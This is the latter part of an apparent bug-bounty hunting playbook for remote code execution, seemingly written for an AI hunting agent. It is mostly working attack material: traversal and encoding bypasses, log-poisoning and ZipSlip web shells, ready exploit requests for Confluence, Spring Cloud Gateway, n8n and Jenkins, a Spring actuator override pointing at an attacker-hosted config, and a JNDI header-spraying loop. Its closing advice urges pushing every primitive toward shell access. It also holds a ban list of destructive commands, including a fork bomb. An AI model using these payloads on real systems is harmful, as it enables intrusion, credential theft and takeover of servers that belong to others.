..%2f..%2f..%2fetc%2fpasswd
```

### Encoding bypasses
```
%2e%2e%2f          (single URL-encode)
%252e%252e%252f    (double URL-encode)
..%c0%af           (overlong UTF-8)
%c0%ae%c0%ae       (overlong dot)
..%c1%9c           (overlong backslash)
..\..\             (Windows)
..;/               (semicolon trick — Tomcat, Spring)
..%00/             (null byte — older PHP)
%u2215             (Unicode fullwidth slash)
```

### Log poisoning → LFI → RCE

**Poison Apache access.log:**
```bash
curl 'https://target.com/' -A "<?php system(\$_GET['c']); ?>"
```

**Then include log via LFI:**
```
https://target.com/?file=../../../../var/log/apache2/access.log&c=id
```

**Also poison:** `/var/log/auth.log` (via SSH username), `/proc/self/environ`, mail logs.

### .htaccess upload → execute PHP
```apache
AddType application/x-httpd-php .jpg .png .gif .txt
```
Upload as `.htaccess`, then upload PHP shell as `.jpg`.

### ZipSlip (archive extraction path traversal)
```bash
# Create malicious zip with traversal filenames
echo '<?php system($_GET["c"]); ?>' > shell.php
zip --symlinks evil.zip shell.php
# Manually craft entry name with ../../../
python3 -c "
import zipfile
with zipfile.ZipFile('zipslip.zip','w') as z:
    z.write('shell.php', '../../../../var/www/html/shell.php')
"
```

### Nginx off-by-slash alias misconfig
```nginx
# Vulnerable config:
location /static {
    alias /usr/share/nginx/static/;
}
# Becomes: /static../../etc/passwd → /usr/share/nginx/static/../../etc/passwd
```
Test: `curl https://target.com/static../etc/passwd`

### PHP wrappers
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.toupper/resource=/etc/passwd
php://input                       (POST body becomes file)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id                       (rare, needs expect ext)
phar://uploads/image.jpg          (PHAR deserialization)
zip://upload.zip%23shell.php
```

### chroot escape
```
../../../../../../../../proc/self/root/etc/passwd
```

---

## SECTION 10: ADMIN PANELS → RCE

### Jenkins

**Script console (full Groovy RCE):**
```bash
curl -u 'user:pass' --data 'script=Runtime.getRuntime().exec("id").text' \
  https://target.com/script
# Or /scriptText for raw output
curl -u 'user:pass' --data-urlencode \
  'script=println("id".execute().text)' \
  https://target.com/scriptText
```

**Anonymous read?** Try `/script` unauthenticated first.

**CVE-2024-23897 (CLI arbitrary file read, leads to RCE via SSH key recovery):**
```bash
java -jar jenkins-cli.jar -s https://target.com/ -webSocket connect-node "@/etc/passwd"
# Read /var/lib/jenkins/secrets/master.key, secret.key, then decrypt credentials
```

**Anonymous job create / build:**
```bash
curl -X POST https://target.com/createItem?name=poc --data-binary @config.xml \
  -H "Content-Type:application/xml"
```

### Confluence CVE-2023-22527 (still mass-exploited 2025)

```http
POST /template/aui/text-inline.vm HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

label=%5cu0027%2b%23request.get(%5cu0027.KEY_velocity.struts2.context%5cu0027).internalGet(%5cu0027ognl%5cu0027).findValue(%23parameters.poc[0],%7b%7d)%2b%5cu0027&poc=@java.lang.Runtime@getRuntime().exec(%22id%22).getInputStream()
```

**Affected:** Confluence Data Center & Server 8.0.x–8.5.3 (excluding LTS patched), 8.0.0–8.4.5.

### Spring Boot Actuator

**Endpoint enumeration:**
```bash
for ep in env health info beans mappings trace heapdump threaddump dump auditevents \
           caches configprops loggers metrics scheduledtasks shutdown httptrace \
           gateway/routes refresh restart pause resume; do
  echo "$ep: $(curl -ks -o /dev/null -w '%{http_code}' https://target.com/actuator/$ep)"
done
```

**/actuator/heapdump → credentials:**
```bash
curl -o heap.bin https://target.com/actuator/heapdump
strings heap.bin | grep -iE 'password|secret|token|api[_-]?key|aws_access' | sort -u
# Better: open in Eclipse Memory Analyzer (MAT) / VisualVM
```

**/actuator/env → property override (when writable):**
```bash
# Set spring.cloud.bootstrap.location to attacker URL, then refresh
curl -X POST https://target.com/actuator/env \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://attacker.com/evil.yml"}'
curl -X POST https://target.com/actuator/refresh
```

**/actuator/gateway/routes (Spring Cloud Gateway CVE-2022-22947):**
```http
POST /actuator/gateway/routes/exploit HTTP/1.1
Content-Type: application/json

{
  "id": "exploit",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "order": 0
}
```
Then `POST /actuator/gateway/refresh` and `GET /exploit` — header `Result` contains RCE output.

**Header bypass (Spring Boot sometimes whitelists localhost):**
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /actuator/env
X-Rewrite-URL: /actuator/env
X-Forwarded-Host: localhost
```

### Werkzeug / Flask debug console

**Detection:** `/console` returns `Werkzeug Debugger`.

**PIN calculation (need 5 inputs from the box — recoverable via LFI):**
1. `username` — `/etc/passwd` (usually root or app user) or `getpass.getuser()`
2. `modname` — usually `flask.app`
3. `app name` — usually `Flask`
4. `moddir` — `/usr/local/lib/python3.X/site-packages/flask/app.py` (probable_public_bits)
5. `uuid_node` — `/sys/class/net/eth0/address` (MAC as int)
6. `machine_id` — `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`

**Recovery script:** [werkzeug-debug-console-bypass](https://github.com/wllm-rbnt/werkzeug-debug-console-bypass) — run after collecting all 6 inputs via LFI.

**Python RCE once console open:**
```python
import os; os.popen('id').read()
__import__('subprocess').check_output(['id'])
```

### n8n CVE-2025-68613 (workflow expression RCE)

**~103,476 exposed instances at disclosure.**

```http
POST /rest/workflows HTTP/1.1
Host: target.com
Authorization: Bearer <token>
Content-Type: application/json

{
  "name": "poc",
  "nodes": [{
    "name": "Start",
    "type": "n8n-nodes-base.start",
    "parameters": {
      "value": "={{ $jmespath(JSON.parse(JSON.stringify(this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')())), '@') }}"
    }
  }],
  "connections": {}
}
```
**Nuclei template available:** `nuclei -t http/cves/2025/CVE-2025-68613.yaml`

### Other high-value panels

| Path | Product | RCE method |
|------|---------|-----------|
| `/h2-console` | H2 DB console | `CREATE ALIAS ... AS $$ Runtime.getRuntime().exec("id"); $$` |
| `/solr/#/` | Apache Solr | VelocityResponseWriter RCE (CVE-2019-17558) |
| `/druid/index.html` | Druid SQL | Groovy RCE in InlineDataSource |
| `/manager/html` | Tomcat | WAR upload (default tomcat:tomcat) |
| `/wp-admin/` | WordPress | Plugin upload, theme editor |
| `/_layouts/15/` | SharePoint | CVE-2025-53770 ToolShell chain |
| `/admin/login` | Strapi | CVE-2023-22893 admin reg |
| `/api-docs` | Swagger | Reveals endpoints for further attack |

---

## SECTION 11: 2025 Critical RCE CVEs

| CVE | Product | CVSS | Auth | Surface | Detection |
|-----|---------|------|------|---------|-----------|
| **CVE-2025-55182** | React RSC | 10.0 | Pre-auth | React Server Components | nuclei template |
| **CVE-2025-49844** | Redis (RediShell) | 10.0 | Post-auth | Redis 6.x/7.x | `INFO` banner + Lua RCE |
| **CVE-2025-59287** | Microsoft WSUS | 9.8 | Pre-auth | Ports 8530/8531 `/ClientWebService/Client.asmx` | SoapFormatter |
| **CVE-2025-64446** | Fortinet FortiWeb | 9.1 | Pre-auth | `/api/v2.0/cmdb/...` path traversal | nuclei kev |
| **CVE-2025-68613** | n8n | 9.9 | Auth | `/rest/workflows` expression injection | banner: `n8n` |
| **CVE-2023-22527** | Atlassian Confluence | 10.0 | Pre-auth | `/template/aui/text-inline.vm` | Still mass-exploited |
| **CVE-2024-38077** | Windows RDL (MadLicense) | 9.8 | Pre-auth | RDP Licensing 3389 | — |
| **CVE-2024-23897** | Jenkins CLI | 9.8 | Pre-auth | Jenkins CLI arg parser | nuclei template |
| **CVE-2025-53770** | SharePoint ToolShell | 9.8 | Pre-auth | SharePoint on-prem | hunt-sharepoint skill |
| **CVE-2025-22457** | Ivanti Connect Secure | 9.0 | Pre-auth | Ivanti VPN appliances | KEV listed |

**Run combined nuclei pass:**
```bash
nuclei -l live.txt -tags kev,vkev -severity critical,high -interactsh-url https://oast.pro
nuclei -l live.txt -t http/cves/2025/ -severity critical,high
nuclei -l live.txt -t http/cves/2024/ -severity critical,high
nuclei -l live.txt -t http/cves/2023/ -severity critical,high -tags rce
```

---

## SECTION 12: Confirmation Rules — Non-Destructive Only

### STRICT BANS — Never run these on bounty targets
- `rm`, `rm -rf`, `unlink`, `del`
- `mkdir` (writing files arbitrarily)
- `shutdown`, `reboot`, `halt`, `poweroff`
- `kill -9`, `killall`
- `iptables`, `ufw`, firewall changes
- Fork bombs: `:(){ :|:& };:` and variants
- Crypto miners, persistence implants
- Writing large files (>10KB)
- Touching `/etc/passwd`, `/root/.ssh/authorized_keys`, `crontab -e`
- Anything modifying production data

### OOB confirmation tools (preferred)
- **Interactsh** — `interactsh-client` — self-hostable OAST, DNS+HTTP+SMTP
- **canarytokens.org** — quick free DNS canaries
- **webhook.site** — HTTP request capture
- **Burp Collaborator** — gold standard (Burp Pro required)

### Safe commands ONLY (use these for PoC)
```bash
id                              # uid, gid, groups
whoami                          # username only
hostname                        # machine name
uname -a                        # kernel, arch
pwd                             # current dir
cat /etc/hostname               # hostname file
cat /proc/self/status | head -3 # PID, user
sleep 10                        # timing-based confirmation
echo "$(id)"                    # bash builtin echo
printenv USER                   # single env var
```

### Minimum confirmation bar
At least ONE of:
1. **DNS hit** via Interactsh / collab — proves outbound execution
2. **`id` output reflected in response** — proves direct execution
3. **Timing delta > 5 seconds** for `sleep N` — proves blind execution
4. **HTTP callback** with execution token in path/query

### Reproducibility requirement
- Reproduce **3 times** in clean sessions before reporting
- Document EXACT request, EXACT response (truncated to 150 chars + `…`)
- Save raw HTTP to `evidence/<finding>/{request.txt,response.txt,curl.sh}`
- Screenshot OOB hit / response with timestamp

---

## SECTION 13: Hunting Workflow (step-by-step priority)

### Phase 0: Baseline (5 min)
```bash
# Subdomain enum already done by recon agent — read recon/subdomains.txt
# Pick highest-value targets: admin, api, internal, dev, staging, jenkins, jira
head -50 recon/live.txt
```

### Phase 1: Nuclei KEV pass (10 min)
```bash
nuclei -l recon/live.txt -tags kev,vkev -severity critical,high \
  -interactsh-url https://oast.pro -rl 50 -o findings/nuclei-kev.txt
# Critical findings: stop and triage immediately
grep -iE 'critical|high' findings/nuclei-kev.txt
```

### Phase 2: Admin panel sweep (5 min)
```bash
nuclei -l recon/live.txt -t http/exposed-panels/ -o findings/panels.txt
# Manually probe each found panel:
for url in $(cat findings/panels.txt | awk '{print $NF}'); do
  curl -ks "$url" -o /dev/null -w "$url %{http_code}\n"
done
```

For each found panel:
- Jenkins → try `/script` anonymously, default creds, CVE-2024-23897
- Confluence → CVE-2023-22527 PoC
- Actuator → enumerate endpoints, dump heap
- Werkzeug → recover PIN via LFI
- n8n → CVE-2025-68613

### Phase 3: SSRF on every URL param (15 min)
```bash
# Collect params likely to fetch
gau target.com | gf ssrf > leads/ssrf-candidates.txt
# Test each with Interactsh URL
cat leads/ssrf-candidates.txt | qsreplace "https://<interactsh>/?ssrf=FUZZ" | \
  httpx -mc 200 -o leads/ssrf-tested.txt
# Watch interactsh for hits → triage to IMDS chain
```

For each SSRF hit:
- Try `http://169.254.169.254/latest/meta-data/`
- Try GCP / Azure metadata
- Try `http://127.0.0.1:6379` (Redis), `:5432` (Postgres), `:9200` (ES)
- Try gopher:// for Redis RCE

### Phase 4: SSTI polyglot sweep (15 min)
```bash
# Run polyglot against every reflected param
cat leads/reflected-params.txt | qsreplace '${{<%[%"}}%\.' | \
  httpx -mc 200,500 -mr 'unexpected|error' -o leads/ssti-suspects.txt
# Manually triage each suspect — identify engine, run targeted detection
```

### Phase 5: File upload bypass matrix (20 min)
For each upload endpoint:
1. Baseline: upload `harmless.jpg` — note path, naming, access pattern
2. Case bypass: `shell.pHp`
3. Double extension: `shell.php.jpg`
4. Alternate ext: `shell.phtml`, `shell.phar`
5. MIME spoofing: Content-Type swap
6. Magic byte prepend: PNG+PHP, GIF+PHP
7. .htaccess upload
8. SVG with XSS/XXE
9. Path traversal in filename
10. Polyglot (GIF89a/<?php)

For each successful upload — attempt direct execution by visiting the file URL.

### Phase 6: JNDI / Log4Shell in headers (10 min)
```bash
# Test every endpoint with JNDI in every common header
HEADERS="User-Agent X-Forwarded-For X-Forwarded-Host X-Forwarded-Proto X-Api-Version Referer True-Client-IP X-Real-IP X-Original-URL"
for url in $(cat recon/live.txt); do
  for h in $HEADERS; do
    curl -ks -o /dev/null "$url" -H "$h: \${jndi:ldap://<collab>/$h-$url}"
  done
done
# Watch interactsh for any DNS hit
```

### Phase 7: Command injection on system-interacting fields (15 min)
Target fields: hostname, IP, URL, filename, ping target, traceroute target, lookup, DNS query, image processing params, video conversion params, archive name, export format.

For each: try detection probes (Section 6), then blind OOB.

### Phase 8: XXE on every XML endpoint (10 min)
Target: any `Content-Type: application/xml`, `text/xml`, `application/soap+xml`, SAML responses, RSS feeds, sitemap uploaders, DOCX/XLSX/SVG/PDF parsers.

Detection: probe with external DTD pointing to Interactsh.

### Phase 9: Deserialization sweep (10 min)
Hunt for:
- ViewState (`__VIEWSTATE`)
- Java serialized cookies (base64 starting `rO0AB`)
- Pickle (base64 starting `gAS`, `gAN`)
- Ruby Marshal (`BAh`)
- PHP serialized (`a:N:{`, `O:N:"`)

Test with URLDNS / Monolog `system id` / pickle `__reduce__`.

### Phase 10: Synthesis
- Chain any IDOR/SSRF/file-upload primitives toward RCE
- Document all confirmed findings with 7-Q gate
- Write reports per `reporting-rules.md`
- Update `memory.md` with what worked / didn't on this target

---

## Quick reference — confirmation checklist before reporting

- [ ] Used only safe commands (`id`, `whoami`, `hostname`, `sleep`, OOB callback)
- [ ] Confirmed 3× in clean sessions
- [ ] Saved raw request/response evidence (truncated where huge)
- [ ] OOB hit screenshot or direct `id` output in response
- [ ] Affected versions / build / CVE identified
- [ ] Severity calculated via CVSS 3.1 — Section 11 CVEs default 9.0+
- [ ] No destructive actions taken
- [ ] Chain primitives evaluated (IDOR + SSRF + file upload → max impact)
- [ ] 7-Q gate passed per `validation.md`

---

**Remember:** RCE is the apex. If you find a primitive (SSRF, file upload, SSTI), push it toward shell access before reporting. A bare SSRF is High; an SSRF that yields IMDS creds and `sts get-caller-identity` is Critical with a clean PoC chain.
